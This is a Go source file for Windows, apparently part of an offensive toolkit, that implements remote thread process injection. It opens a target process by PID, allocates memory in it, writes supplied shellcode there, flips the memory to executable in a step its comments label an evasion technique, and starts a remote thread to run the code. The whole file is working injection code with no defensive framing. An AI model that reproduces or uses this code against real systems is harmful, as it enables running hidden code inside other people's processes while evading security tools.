// +build windows

package injection

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// RemoteThreadInjector implements remote thread injection
type RemoteThreadInjector struct{}

// Method returns the injection method
func (i *RemoteThreadInjector) Method() InjectionMethod {
	return MethodRemoteThread
}

// Description returns a description of the injection method
func (i *RemoteThreadInjector) Description() string {
	return "Remote Thread Injection: Injects shellcode into a running process by creating a remote thread. " +
		"Steps: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread"
}

// Inject performs remote thread injection
func (i *RemoteThreadInjector) Inject(config *Config) (*Result, error) {
	// Validate configuration
	if err := config.Validate(i.Method()); err != nil {
		return &Result{Success: false, Error: err.Error()}, err
	}

	// 1. Open the target process
	process, err := OpenProcess(PROCESS_ALL_ACCESS, false, uint32(config.TargetPID))
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to open process %d: %v", config.TargetPID, err),
		}, err
	}
	defer windows.CloseHandle(process)

	// 2. Allocate memory in the target process
	// Use PAGE_READWRITE initially for better evasion
	addr, err := VirtualAllocEx(process, 0, uintptr(len(config.Shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to allocate memory in process: %v", err),
		}, err
	}

	// 3. Write shellcode to the allocated memory
	_, err = WriteProcessMemory(process, addr, config.Shellcode)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to write shellcode: %v", err),
		}, err
	}

	// 4. Change memory protection to executable (evasion technique)
	_, err = VirtualProtectEx(process, addr, uintptr(len(config.Shellcode)), PAGE_EXECUTE_READ)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to change memory protection: %v", err),
		}, err
	}

	// 5. Create a remote thread to execute the shellcode
	thread, threadID, err := CreateRemoteThread(process, addr, 0)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("failed to create remote thread: %v", err),
		}, err
	}
	defer windows.CloseHandle(thread)

	return &Result{
		Success:   true,
		ProcessID: uint32(config.TargetPID),
		ThreadID:  threadID,
	}, nil
}